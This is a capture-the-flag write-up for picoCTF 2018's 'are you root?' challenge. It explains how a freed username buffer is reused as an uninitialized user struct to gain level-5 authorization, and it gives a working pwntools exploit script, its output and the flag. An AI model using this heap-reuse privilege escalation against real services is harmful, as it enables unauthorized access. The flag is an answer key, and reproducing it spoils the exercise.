# are you root?
Binary Exploitation, 550 points

## Description:
> Can you get root access through this service and get the flag?

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

typedef enum auth_level {
  ANONYMOUS = 1,
  GUEST = 2,
  USER = 3,
  ADMIN = 4,
  ROOT = 5
} auth_level_t;
  
struct user {
  char *name;
  auth_level_t level;
};

void give_flag(){
  char flag[48];
  FILE *f = fopen("flag.txt", "r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  if ((fgets(flag, 48, f)) == NULL){
    puts("Couldn't read flag file.");
    exit(1);
  };
  
  puts(flag);
  fclose(f);
}

void menu(){
  puts("Available commands:");
  puts("\tshow - show your current user and authorization level");
  puts("\tlogin [name] - log in as [name]");
  puts("\tset-auth [level] - set your authorization level (must be below 5)");
  puts("\tget-flag - print the flag (requires authorization level 5)");
  puts("\treset - log out and reset authorization level");
  puts("\tquit - exit the program");
}

int main(int argc, char **argv){
  char buf[512];
  char *arg;
  uint32_t level;
  struct user *user;

  setbuf(stdout, NULL);

  menu();

  user = NULL;
  while(1){
    puts("\nEnter your command:");
    putchar('>'); putchar(' ');

    if(fgets(buf, 512, stdin) == NULL)
      break;

    if (!strncmp(buf, "show", 4)){
      if(user == NULL){
	puts("Not logged in.");
      }else{
	printf("Logged in as %s [%u]\n", user->name, user->level);
      }

    }else if (!strncmp(buf, "login", 5)){
      if (user != NULL){
	puts("Already logged in. Reset first.");
	continue;
      }

      arg = strtok(&buf[6], "\n");
      if (arg == NULL){
	puts("Invalid command");
	continue;
      }

      user = (struct user *)malloc(sizeof(struct user));
      if (user == NULL) {
	puts("malloc() returned NULL. Out of Memory\n");
	exit(-1);
      }
      user->name = strdup(arg);
      printf("Logged in as \"%s\"\n", arg);

    }else if(!strncmp(buf, "set-auth", 8)){
      if(user == NULL){
	puts("Login first.");
	continue;
      }

      arg = strtok(&buf[9], "\n");
      if (arg == NULL){
	puts("Invalid command");
	continue;
      }

      level = strtoul(arg, NULL, 10);

      if (level >= 5){
	puts("Can only set authorization level below 5");
	continue;
      }

      user->level = level;
      printf("Set authorization level to \"%u\"\n", level);

    }else if(!strncmp(buf, "get-flag", 8)){
      if (user == NULL){
	puts("Login first!");
	continue;
      }

      if (user->level != 5){
	puts("Must have authorization level 5.");
	continue;
      }

      give_flag();
    }else if(!strncmp(buf, "reset", 5)){
      if (user == NULL){
	puts("Not logged in!");
	continue;
      }

      free(user->name);
      user = NULL;

      puts("Logged out!");
    }else if(!strncmp(buf, "quit", 4)){
      return 0;
    }else{
      puts("Invalid option");
      menu();
    }
  }
}

```

## Solution:

We need to login as root (i.e. auth-level 5) in order to be able to read the flag. However, setting authorization level to level 5 is not allowed.

Instead, we will use a "use without initialization" vulnerability to trick the program into thinking we are authorized.

Let's take a look at the heap usage across the program:
During login, we have two allocations:
* `user = (struct user *)malloc(sizeof(struct user));`
* `user->name = strdup(arg);`

During reset, we have just one free:
* `free(user->name);`

Another important fact is the the authorization level is only set using the "set-auth" command, meaning that when a user logs in, the value in his "level" member of the user struct is uninitialized:
```c
struct user {
  char *name;
  auth_level_t level;
};
```

The executable is 64-bit, and therefore the `user` struct is 16 bytes. This can also be confirmed from the disassembly:
```assembly
0x00400c07      bf10000000     mov edi, 0x10               ; 16
0x00400c0c      e83ffcffff     call sym.imp.malloc         ;  void *malloc(size_t size)
```

Now, if we create a user with a 16-byte-long username, logout, and create another user, most chances are that the heap manager will reallocate the username buffer for the new user struct - since they both have the same size.
The chances are even higher since the old user struct (also of size 16) doesn't get freed, as seen earlier.

So if we create a user with a specially crafted username, the content of the username might be reused as a user struct later on.

```
1. Allocate user with name "aaaaaaaa\x05\x00\x00\x00\x00\x00\x00\x00"
          struct user                  username
          +----------+                 +----------+
username: | pointer  |---------------->| aaaaaaaa |
          +----------+                 +----------+
   level: | 0x0      |                 + 0x5      |
          +----------+                 +----------+

2. Free user
          struct user - memory leak    Free memory
          +----------+                 +----------+
username: | pointer  | --------------->| aaaaaaaa |
          +----------+                 +----------+
   level: | 0x0      |                 + 0x5      |
          +----------+                 +----------+

3. Allocate user with name "A"
          struct user - memory leak    New user                    New name
          +----------+                 +----------+                +----------+
username: | pointer  | --->  username: | aaaaaaaa |--------------->| A        |
          +----------+                 +----------+                +----------+
   level: | 0x0      |          level: + 0x5      |
          +----------+                 +----------+
```

The original user struct still points to the original name, but that doesn't really matter anymore.

Another important note is that the program uses `fgets` to read the input, so we can send `'\0'` NULL characters and they will be read into the input buffer. It also helps that the program decides where the user argument has ended by searching for a linefeed (`strtok(&buf[6], "\n")`) and not for a NULL terminator.

The script:
```python
from pwn import *

REQUESTED_ACCESS_LEVEL = 5

r = remote("2018shell3.picoctf.com", 29508)

def send_command(command):
    r.recvuntil("> ")
    r.sendline(command)
    return r.recvline()

def show():
    return send_command("show")

def login(name):
    log.info("Logging in as {} ({})".format(name, enhex(name)))
    return send_command("login " + name)

def set_auth(auth):
    return send_command("set-auth " + str(auth))

def get_flag():
    return send_command("get-flag")

def reset():
    log.info("Performing reset")
    return send_command("reset")

def quit():
    return send_command("quit")

login("a"*8 + p64(REQUESTED_ACCESS_LEVEL))
reset()
login("A")
s = show()
log.info("Login info: {}".format(s))
if "[{}]".format(REQUESTED_ACCESS_LEVEL) in s:
    log.success("Flag: {}".format(get_flag()))
```

The output:
```console
root@kali:/media/sf_CTFs/pico/are_you_root# python exploit.py
[+] Opening connection to 2018shell3.picoctf.com on port 29508: Done
[*] Logging in as aaaaaaaa\x05\x00\x00\x00\x00\x00\x00\x00 (61616161616161610500000000000000)
[*] Performing reset
[*] Logging in as A (41)
[*] Login info: Logged in as A [5]
[+] Flag: picoCTF{m3sS1nG_w1tH_tH3_h43p_a5e65af1}
[*] Closed connection to 2018shell3.picoctf.com port 29508
```

The flag: picoCTF{m3sS1nG_w1tH_tH3_h43p_a5e65af1}